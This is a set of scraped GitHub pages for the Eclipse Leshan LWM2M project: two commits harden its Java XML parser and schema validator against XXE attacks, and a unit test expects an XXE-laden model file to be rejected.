  [LWM2M Devices with Dynamic IP](/eclipse-leshan/leshan/wiki/LWM2M-Devices-with-Dynamic-IP)
* Loading

  [LWM2M Observe](/eclipse-leshan/leshan/wiki/LWM2M-Observe)
* Loading

  [LWM2M Supported features](/eclipse-leshan/leshan/wiki/LWM2M-Supported-features)
* Loading

  [Modules](/eclipse-leshan/leshan/wiki/Modules)
* Loading

  [Request Timeout](/eclipse-leshan/leshan/wiki/Request-Timeout)
* Loading

  [Roadmap](/eclipse-leshan/leshan/wiki/Roadmap)
* Loading

  [Security Development Documention](/eclipse-leshan/leshan/wiki/Security-Development-Documention)
* Loading

  [Server Failover](/eclipse-leshan/leshan/wiki/Server-Failover)
* Loading

  [Using CoAP Block Wise to transfer large file ?](/eclipse-leshan/leshan/wiki/Using-CoAP-Block-Wise-to-transfer-large-file-%3F)
* Loading

  [Using Leshan server in a cluster](/eclipse-leshan/leshan/wiki/Using-Leshan-server-in-a-cluster)
* Show 13 more pages…

[![Leshan](https://camo.githubusercontent.com/9540935ceee1412061d7b519a2e40a2931e4e320ae23e17e481b71e99abeb553/68747470733a2f2f65636c697073652e6f72672f6c657368616e2f696d672f6d756c7469636f6c6f722d6c657368616e2e706e67)](https://github.com/eclipse/leshan/wiki)

---

**[Getting started](/eclipse-leshan/leshan/wiki/Getting-started)**

**[How to contribute](/eclipse-leshan/leshan/wiki/How-to-contribute)**

**[LWM2M supported features](/eclipse-leshan/leshan/wiki/LWM2M-Supported-features)**

**[Roadmap](/eclipse-leshan/leshan/wiki/Roadmap)**

**[F.A.Q.](/eclipse-leshan/leshan/wiki/F.A.Q.)**

##### Clone this wiki locally

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1ba448f4_20250111_123842.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fcommit%2F29577d2879ba8e7674c3b216a7f01193fc7ae013)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fcommit%2F29577d2879ba8e7674c3b216a7f01193fc7ae013)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eclipse-leshan%2Fleshan)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-leshan](/eclipse-leshan)
/
**[leshan](/eclipse-leshan/leshan)**
Public

* [Notifications](/login?return_to=%2Feclipse-leshan%2Fleshan) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Feclipse-leshan%2Fleshan)
* [Star
   656](/login?return_to=%2Feclipse-leshan%2Fleshan)

* [Code](/eclipse-leshan/leshan)
* [Issues
  87](/eclipse-leshan/leshan/issues)
* [Pull requests
  10](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects
  0](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

Additional navigation options

* [Code](/eclipse-leshan/leshan)
* [Issues](/eclipse-leshan/leshan/issues)
* [Pull requests](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

## Commit

[Permalink](/eclipse-leshan/leshan/commit/29577d2879ba8e7674c3b216a7f01193fc7ae013)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Make DDFFileParser and DefaultDDFFileValidator safer.

[Browse files](/eclipse-leshan/leshan/tree/29577d2879ba8e7674c3b216a7f01193fc7ae013)
Browse the repository at this point in the history

* Loading branch information

[![@sbernard31](https://avatars.githubusercontent.com/u/840294?s=40&v=4)](/sbernard31)

[sbernard31](/eclipse-leshan/leshan/commits?author=sbernard31 "View all commits by sbernard31")
committed
Aug 29, 2023

1 parent
[547eb0e](/eclipse-leshan/leshan/commit/547eb0e6c5d6435e0172293c2d1deccbc4f10f4e)

commit 29577d2

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**56 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* leshan-core/src/main/java/org/eclipse/leshan/core/model

  + leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java
    [DDFFileParser.java](#diff-893a1f216e4d2a91ba87f70464f226742af308cf14cd900926c9a4dd53768781)
  + leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java
    [DefaultDDFFileValidator.java](#diff-dd78eafec538365d19fd20df80930cb260634e8c6cc21107162a0ac0ae70fb27)

## There are no files selected for viewing

32 changes: 30 additions & 2 deletions

32
[leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java](#diff-893a1f216e4d2a91ba87f70464f226742af308cf14cd900926c9a4dd53768781 "leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java")

Show comments

[View file](/eclipse-leshan/leshan/blob/29577d2879ba8e7674c3b216a7f01193fc7ae013/leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -24,6 +24,7 @@ |
|  |  | import java.util.List; |
|  |  | import java.util.Map; |
|  |  |  |
|  |  | import javax.xml.XMLConstants; |
|  |  | import javax.xml.parsers.DocumentBuilder; |
|  |  | import javax.xml.parsers.DocumentBuilderFactory; |
|  |  | import javax.xml.parsers.ParserConfigurationException; |
| Expand Down  Expand Up | | @@ -75,12 +76,39 @@ public DDFFileParser(DDFFileValidatorFactory ddfFileValidatorFactory) { |
|  |  | } |
|  |  |  |
|  |  | private DDFFileParser(DDFFileValidator ddfValidator, DDFFileValidatorFactory ddfFileValidatorFactory) { |
|  |  | factory = DocumentBuilderFactory.newInstance(); |
|  |  | factory.setNamespaceAware(true); |
|  |  | this.factory = createDocumentBuilderFactory(); |
|  |  | this.ddfValidator = ddfValidator; |
|  |  | this.ddfValidatorFactory = ddfFileValidatorFactory; |
|  |  | } |
|  |  |  |
|  |  | protected DocumentBuilderFactory createDocumentBuilderFactory() { |
|  |  | DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); |
|  |  | try { |
|  |  | // Create Safe DocumentBuilderFactory (not vulnerable to XXE Attacks) |
|  |  | // ----------------------------------------------------------------- |
|  |  | // There is several recommendation from different source we try to apply all, even if some are maybe |
|  |  | // redundant. |
|  |  |  |
|  |  | // from : |
|  |  | // https://semgrep.dev/docs/cheat-sheets/java-xxe/ |
|  |  | factory.setFeature(XMLConstants.FEATURE\_SECURE\_PROCESSING, true); |
|  |  |  |
|  |  | // from : |
|  |  | // https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j |
|  |  | factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // Disable DTDs |
|  |  | factory.setXIncludeAware(false); // Disable XML Inclusions |
|  |  |  |
|  |  | // from : |
|  |  | // https://community.veracode.com/s/article/Java-Remediation-Guidance-for-XXE |
|  |  | factory.setExpandEntityReferences(false); // disable expand entity reference nodes |
|  |  |  |
|  |  | } catch (ParserConfigurationException e) { |
|  |  | throw new IllegalStateException("Unable to create DocumentBuilderFactory", e); |
|  |  | } |
|  |  | factory.setNamespaceAware(true); |
|  |  | return factory; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Parse a DDF file. |
|  |  | \* |
| Expand Down | |  |

27 changes: 26 additions & 1 deletion

27
[leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java](#diff-dd78eafec538365d19fd20df80930cb260634e8c6cc21107162a0ac0ae70fb27 "leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java")

Show comments

[View file](/eclipse-leshan/leshan/blob/29577d2879ba8e7674c3b216a7f01193fc7ae013/leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -30,6 +30,8 @@ |
|  |  | import org.eclipse.leshan.core.util.Validate; |
|  |  | import org.w3c.dom.Node; |
|  |  | import org.xml.sax.SAXException; |
|  |  | import org.xml.sax.SAXNotRecognizedException; |
|  |  | import org.xml.sax.SAXNotSupportedException; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* A DDF File Validator. |
| Expand Down  Expand Up | | @@ -95,7 +97,30 @@ public void validate(Source xmlToValidate) throws SAXException, IOException { |
|  |  | protected Schema getEmbeddedLwM2mSchema() throws SAXException { |
|  |  | InputStream inputStream = DDFFileValidator.class.getResourceAsStream(schema); |
|  |  | Source source = new StreamSource(inputStream); |
|  |  | SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C\_XML\_SCHEMA\_NS\_URI); |
|  |  | SchemaFactory schemaFactory = createSchemaFactory(); |
|  |  | return schemaFactory.newSchema(source); |
|  |  | } |
|  |  |  |
|  |  | protected SchemaFactory createSchemaFactory() { |
|  |  | SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C\_XML\_SCHEMA\_NS\_URI); |
|  |  | try { |
|  |  | // Create Safe SchemaFactory (not vulnerable to XXE Attacks) |
|  |  | // -------------------------------------------------------- |
|  |  | // There is several recommendation from different source we try to apply all, even if some are maybe |
|  |  | // redundant. |
|  |  |  |
|  |  | // from : |
|  |  | // https://semgrep.dev/docs/cheat-sheets/java-xxe/ |
|  |  | factory.setFeature(XMLConstants.FEATURE\_SECURE\_PROCESSING, true); |
|  |  |  |
|  |  | // from : |
|  |  | // https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html#schemafactory |
|  |  | factory.setProperty(XMLConstants.ACCESS\_EXTERNAL\_DTD, ""); |
|  |  | factory.setProperty(XMLConstants.ACCESS\_EXTERNAL\_SCHEMA, ""); |
|  |  |  |
|  |  | } catch (SAXNotRecognizedException | SAXNotSupportedException e) { |
|  |  | throw new IllegalStateException("Unable to create SchemaFactory", e); |
|  |  | } |
|  |  | return factory; |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `29577d2`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fcommit%2F29577d2879ba8e7674c3b216a7f01193fc7ae013) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_70671886_20250111_123843.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fcommit%2F4d3e63ac271a817f81fba3e3229c519af7a3049c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fcommit%2F4d3e63ac271a817f81fba3e3229c519af7a3049c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eclipse-leshan%2Fleshan)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-leshan](/eclipse-leshan)
/
**[leshan](/eclipse-leshan/leshan)**
Public

* [Notifications](/login?return_to=%2Feclipse-leshan%2Fleshan) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Feclipse-leshan%2Fleshan)
* [Star
   656](/login?return_to=%2Feclipse-leshan%2Fleshan)

* [Code](/eclipse-leshan/leshan)
* [Issues
  87](/eclipse-leshan/leshan/issues)
* [Pull requests
  10](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects
  0](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

Additional navigation options

* [Code](/eclipse-leshan/leshan)
* [Issues](/eclipse-leshan/leshan/issues)
* [Pull requests](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

## Commit

[Permalink](/eclipse-leshan/leshan/commit/4d3e63ac271a817f81fba3e3229c519af7a3049c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Make DDFFileParser and DefaultDDFFileValidator safer.

[Browse files](/eclipse-leshan/leshan/tree/4d3e63ac271a817f81fba3e3229c519af7a3049c)
Browse the repository at this point in the history

* Loading branch information

[![@sbernard31](https://avatars.githubusercontent.com/u/840294?s=40&v=4)](/sbernard31)

[sbernard31](/eclipse-leshan/leshan/commits?author=sbernard31 "View all commits by sbernard31")
committed
Aug 29, 2023

1 parent
[2d0ae8e](/eclipse-leshan/leshan/commit/2d0ae8ea02701c213e25b70feb95fc6aaf538e4d)

commit 4d3e63a

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**61 additions**
and
**10 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* leshan-core/src

  + main/java/org/eclipse/leshan/core/model

    - leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java
      [DDFFileParser.java](#diff-893a1f216e4d2a91ba87f70464f226742af308cf14cd900926c9a4dd53768781)
    - leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java
      [DefaultDDFFileValidator.java](#diff-dd78eafec538365d19fd20df80930cb260634e8c6cc21107162a0ac0ae70fb27)
  + test/java/org/eclipse/leshan/core/model

    - leshan-core/src/test/java/org/eclipse/leshan/core/model/DDFFileParserTest.java
      [DDFFileParserTest.java](#diff-f6025141e3e13d878586004e77d83f55e196a69f9582c4620f6c0c96d9c3deca)

## There are no files selected for viewing

32 changes: 30 additions & 2 deletions

32
[leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java](#diff-893a1f216e4d2a91ba87f70464f226742af308cf14cd900926c9a4dd53768781 "leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java")

Show comments

[View file](/eclipse-leshan/leshan/blob/4d3e63ac271a817f81fba3e3229c519af7a3049c/leshan-core/src/main/java/org/eclipse/leshan/core/model/DDFFileParser.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -23,6 +23,7 @@ |
|  |  | import java.util.Collections; |
|  |  | import java.util.List; |
|  |  |  |
|  |  | import javax.xml.XMLConstants; |
|  |  | import javax.xml.parsers.DocumentBuilder; |
|  |  | import javax.xml.parsers.DocumentBuilderFactory; |
|  |  | import javax.xml.parsers.ParserConfigurationException; |
| Expand Down  Expand Up | | @@ -59,11 +60,38 @@ public DDFFileParser() { |
|  |  | \* @since 1.1 |
|  |  | \*/ |
|  |  | public DDFFileParser(DDFFileValidator ddfValidator) { |
|  |  | factory = DocumentBuilderFactory.newInstance(); |
|  |  | factory.setNamespaceAware(true); |
|  |  | factory = createDocumentBuilderFactory(); |
|  |  | this.ddfValidator = ddfValidator; |
|  |  | } |
|  |  |  |
|  |  | protected DocumentBuilderFactory createDocumentBuilderFactory() { |
|  |  | DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); |
|  |  | try { |
|  |  | // Create Safe DocumentBuilderFactory (not vulnerable to XXE Attacks) |
|  |  | // ----------------------------------------------------------------- |
|  |  | // There is several recommendation from different source we try to apply all, even if some are maybe |
|  |  | // redundant. |
|  |  |  |
|  |  | // from : |
|  |  | // https://semgrep.dev/docs/cheat-sheets/java-xxe/ |
|  |  | factory.setFeature(XMLConstants.FEATURE\_SECURE\_PROCESSING, true); |
|  |  |  |
|  |  | // from : |
|  |  | // https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j |
|  |  | factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // Disable DTDs |
|  |  | factory.setXIncludeAware(false); // Disable XML Inclusions |
|  |  |  |
|  |  | // from : |
|  |  | // https://community.veracode.com/s/article/Java-Remediation-Guidance-for-XXE |
|  |  | factory.setExpandEntityReferences(false); // disable expand entity reference nodes |
|  |  |  |
|  |  | } catch (ParserConfigurationException e) { |
|  |  | throw new IllegalStateException("Unable to create DocumentBuilderFactory", e); |
|  |  | } |
|  |  | factory.setNamespaceAware(true); |
|  |  | return factory; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @deprecated use {@link #parseEx(File)} |
|  |  | \*/ |
| Expand Down | |  |

29 changes: 28 additions & 1 deletion

29
[leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java](#diff-dd78eafec538365d19fd20df80930cb260634e8c6cc21107162a0ac0ae70fb27 "leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java")

Show comments

[View file](/eclipse-leshan/leshan/blob/4d3e63ac271a817f81fba3e3229c519af7a3049c/leshan-core/src/main/java/org/eclipse/leshan/core/model/DefaultDDFFileValidator.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -28,6 +28,8 @@ |
|  |  |  |
|  |  | import org.w3c.dom.Node; |
|  |  | import org.xml.sax.SAXException; |
|  |  | import org.xml.sax.SAXNotRecognizedException; |
|  |  | import org.xml.sax.SAXNotSupportedException; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* A DDF File Validator. |
| Expand All | | @@ -39,6 +41,8 @@ |
|  |  |  |
|  |  | public class DefaultDDFFileValidator implements DDFFileValidator { |
|  |  | private static String LWM2M\_V1\_SCHEMA\_PATH = "/schemas/LWM2M.xsd"; |
|  |  | private static final String ACCESS\_EXTERNAL\_DTD = "http://javax.xml.XMLConstants/property/accessExternalDTD"; |
|  |  | private static final String ACCESS\_EXTERNAL\_SCHEMA = "http://javax.xml.XMLConstants/property/accessExternalSchema"; |
|  |  |  |
|  |  | @Override |
|  |  | public void validate(Node xmlToValidate) throws InvalidDDFFileException { |
| Expand Down  Expand Up | | @@ -69,7 +73,30 @@ public void validate(Source xmlToValidate) throws SAXException, IOException { |
|  |  | protected Schema getEmbeddedLwM2mSchema() throws SAXException { |
|  |  | InputStream inputStream = DDFFileValidator.class.getResourceAsStream(LWM2M\_V1\_SCHEMA\_PATH); |
|  |  | Source source = new StreamSource(inputStream); |
|  |  | SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C\_XML\_SCHEMA\_NS\_URI); |
|  |  | SchemaFactory schemaFactory = createSchemaFactory(); |
|  |  | return schemaFactory.newSchema(source); |
|  |  | } |
|  |  |  |
|  |  | protected SchemaFactory createSchemaFactory() { |
|  |  | SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C\_XML\_SCHEMA\_NS\_URI); |
|  |  | try { |
|  |  | // Create Safe SchemaFactory (not vulnerable to XXE Attacks) |
|  |  | // -------------------------------------------------------- |
|  |  | // There is several recommendation from different source we try to apply all, even if some are maybe |
|  |  | // redundant. |
|  |  |  |
|  |  | // from : |
|  |  | // https://semgrep.dev/docs/cheat-sheets/java-xxe/ |
|  |  | factory.setFeature(XMLConstants.FEATURE\_SECURE\_PROCESSING, true); |
|  |  |  |
|  |  | // from : |
|  |  | // https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html#schemafactory |
|  |  | factory.setProperty(ACCESS\_EXTERNAL\_DTD, ""); |
|  |  | factory.setProperty(ACCESS\_EXTERNAL\_SCHEMA, ""); |
|  |  |  |
|  |  | } catch (SAXNotRecognizedException | SAXNotSupportedException e) { |
|  |  | throw new IllegalStateException("Unable to create SchemaFactory", e); |
|  |  | } |
|  |  | return factory; |
|  |  | } |
|  |  | } |

10 changes: 3 additions & 7 deletions

10
[leshan-core/src/test/java/org/eclipse/leshan/core/model/DDFFileParserTest.java](#diff-f6025141e3e13d878586004e77d83f55e196a69f9582c4620f6c0c96d9c3deca "leshan-core/src/test/java/org/eclipse/leshan/core/model/DDFFileParserTest.java")

Show comments

[View file](/eclipse-leshan/leshan/blob/4d3e63ac271a817f81fba3e3229c519af7a3049c/leshan-core/src/test/java/org/eclipse/leshan/core/model/DDFFileParserTest.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -15,18 +15,14 @@ |
|  |  | \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ |
|  |  | package org.eclipse.leshan.core.model; |
|  |  |  |
|  |  | import static org.junit.jupiter.api.Assertions.assertThrows; |
|  |  |  |
|  |  | import java.io.IOException; |
|  |  |  |
|  |  | import org.junit.jupiter.api.Test; |
|  |  | import org.junit.Test; |
|  |  |  |
|  |  | public class DDFFileParserTest { |
|  |  |  |
|  |  | @Test |
|  |  | @Test(expected = InvalidDDFFileException.class) |
|  |  | public void test\_xxe\_injection\_failed() throws IOException, InvalidModelException, InvalidDDFFileException { |
|  |  | assertThrows(InvalidDDFFileException.class, () -> { |
|  |  | ObjectLoader.loadDdfResources("/models/", new String[] { "xxe\_injection.xml" }, true); |
|  |  | }); |
|  |  | ObjectLoader.loadDdfResources("/models/", new String[] { "xxe\_injection.xml" }, true); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `4d3e63a`

Please
